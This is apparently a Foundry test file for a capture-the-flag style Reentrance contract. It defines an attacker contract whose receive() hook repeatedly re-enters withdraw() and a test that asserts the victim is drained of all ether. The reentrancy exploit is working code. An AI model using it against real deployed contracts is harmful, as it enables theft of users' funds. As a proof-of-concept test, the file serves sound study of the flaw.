// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrance.sol";

contract ReentranceAttack {
    Reentrance public victim;
    uint public attackAmount;

    constructor(address payable _victim) payable {
        victim = Reentrance(_victim);
    }

    function attack() external payable {
        attackAmount = victim.balanceOf(address(this));
        victim.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(victim).balance >= attackAmount) {
            victim.withdraw(attackAmount);
        }
    }
}

contract ReentranceTest is Test {
    Reentrance public reentrance;
    ReentranceAttack public attacker;
    address public user = address(0x1);
    uint public initialDeposit = 1 ether;

    function setUp() public {
        reentrance = new Reentrance();
        vm.deal(user, initialDeposit * 2);

        // User deposits funds
        vm.prank(user);
        reentrance.donate{value: initialDeposit}(user);
    }

    function testReentrancyAttack() public {
        // Deploy attacker contract with initial funds
        attacker = new ReentranceAttack{value: initialDeposit}(payable(address(reentrance)));

        // Attacker deposits funds to have a balance
        vm.prank(address(attacker));
        reentrance.donate{value: initialDeposit}(address(attacker));

        uint initialContractBalance = address(reentrance).balance;
        uint initialAttackerBalance = address(attacker).balance;
        uint attackerBalanceRecordBefore = reentrance.balanceOf(address(attacker));

        console.log("--- BEFORE-Trigger ---");
        console.log("Victim contract balance: %d", initialContractBalance);
        console.log("Attacker contract ether balance: %d", initialAttackerBalance);
        console.log("Attacker's balance record in victim contract: %d", attackerBalanceRecordBefore);

        console.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack();

        uint finalContractBalance = address(reentrance).balance;
        uint finalAttackerBalance = address(attacker).balance;
        uint attackerBalanceRecordAfter = reentrance.balanceOf(address(attacker));

        console.log("--- AFTER-Trigger ---");
        console.log("Victim contract balance: %d", finalContractBalance);
        console.log("Attacker contract ether balance: %d", finalAttackerBalance);
        console.log("Attacker's balance record in victim contract: %d", attackerBalanceRecordAfter);

        bool contractDrained = finalContractBalance == 0;
        bool fundsStolen = finalAttackerBalance == initialAttackerBalance + initialContractBalance;

        if (contractDrained && fundsStolen) {
            console.log("Vulnerability Exists: Attacker successfully drained the victim contract");
        } else {
            console.log("Vulnerability not Exist: Attack failed to drain victim contract");
        }

        // Verify attack was successful
        assertEq(finalContractBalance, 0, "Contract should be drained");
        assertEq(
            finalAttackerBalance,
            initialAttackerBalance + initialContractBalance,
            "Attacker should have stolen all funds"
        );
    }
}